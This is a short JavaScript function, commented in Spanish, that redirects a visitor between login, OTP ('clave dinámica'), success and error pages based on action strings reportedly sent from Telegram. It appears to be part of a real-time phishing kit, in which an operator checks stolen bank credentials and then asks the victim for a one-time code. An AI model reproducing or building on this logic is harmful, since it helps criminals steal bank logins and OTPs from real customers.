// ================================================================
// Manejo de acciones desde Telegram
// ================================================================
async function handleAction(action, transactionId) {
  const loadingSpinner = document.querySelector(".loadingContainer");
  
  console.log("🎯 Manejando acción:", action);
  
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
      console.log("✅ Datos correctos, continuando...");
      window.location.href = "exito.html";
      break;
      
    case 'incorrecto':
    case 'error_login':
      console.log("❌ Datos incorrectos, volviendo al login...");
      localStorage.clear();
      window.location.href = "indexx.html?error=1";
      break;
      
    case 'pedir_dinamica':
      console.log("🔐 Solicitando clave dinámica...");
      window.location.href = "otp.html";
      break;
      
    case 'error_dinamica':
      console.log("⚠️ Error en clave dinámica...");
      alert("Clave dinámica incorrecta. Intenta nuevamente.");
      window.location.href = "otp.html";
      break;
      
    case 'finish':
      console.log("✔️ Proceso finalizado");
      localStorage.clear();
      setTimeout(() => {
        window.location.href = "index.html";
      }, 2000);
      break;
      
    default:
      console.error("❌ Acción desconocida:", action);
      alert("Error en la validación. Intenta nuevamente.");
      window.location.href = "indexx.html";
  }
}
